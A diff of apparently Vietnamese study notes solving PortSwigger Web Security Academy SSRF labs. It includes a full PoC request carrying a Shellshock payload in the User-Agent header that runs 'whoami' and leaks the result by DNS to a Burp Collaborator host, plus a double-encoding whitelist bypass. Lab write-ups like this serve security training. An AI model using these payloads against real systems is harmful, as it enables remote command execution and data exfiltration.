@@ -1,45 +1,46 @@
-
-
+## SSRF Expert Lab
 
 ### Lab: Blind SSRF with Shellshock exploitation
 
-- Sử dụng Burp Collaborator + shellshock
+- Sử dụng `Burp Collaborator` + `shellshock`
 
     ```
     () { :; }; /bin/nslookup $(whoami).c8l36qt5b2ijpw0w9hz1956wcnie64ut.oastify.com
     ```
 
-- Brute dải ip 192.168.0.X/24, poll về Burp Collaborator
+- Brute dải ip `192.168.0.X/24`, poll về `Burp Collaborator`
 
-- PoC
+    - PoC
 
-    ```
-    GET /product?productId=1 HTTP/2
-    Host: 0a4100a803d9d75d80374e1200ee002d.web-security-academy.net
-    Cookie: session=7GkfQCYn4FAuKMTR2yNy7OLkOaopCQQU
-    Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
-    Sec-Ch-Ua-Mobile: ?0
-    Sec-Ch-Ua-Platform: "Windows"
-    Accept-Language: en-US,en;q=0.9
-    Upgrade-Insecure-Requests: 1
-    User-Agent: () { :; }; /bin/nslookup $(whoami).c8l36qt5b2ijpw0w9hz1956wcnie64ut.oastify.com
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-    Sec-Fetch-Site: same-origin
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-User: ?1
-    Sec-Fetch-Dest: document
-    Referer: http://192.168.0.1:8080/
-    Accept-Encoding: gzip, deflate, br
-    Priority: u=0, i
-    ```
+        ```
+        GET /product?productId=1 HTTP/2
+        Host: 0a4100a803d9d75d80374e1200ee002d.web-security-academy.net
+        Cookie: session=7GkfQCYn4FAuKMTR2yNy7OLkOaopCQQU
+        Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Accept-Language: en-US,en;q=0.9
+        Upgrade-Insecure-Requests: 1
+        User-Agent: () { :; }; /bin/nslookup $(whoami).c8l36qt5b2ijpw0w9hz1956wcnie64ut.oastify.com
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Referer: http://192.168.0.1:8080/
+        Accept-Encoding: gzip, deflate, br
+        Priority: u=0, i
+        ```
 
 
 ### Lab: SSRF with whitelist-based input filter
 
 - Thử payload SSRF cơ bản ở phần check stockapi nhưng bị chặn
+
     ```text
-    "External stock check host must be stock.weliketoshop.net"
+    External stock check host must be stock.weliketoshop.net
     ```
+
     - Thử bypass bằng `#`, encode 2 lần để thành `%2523`
 
 
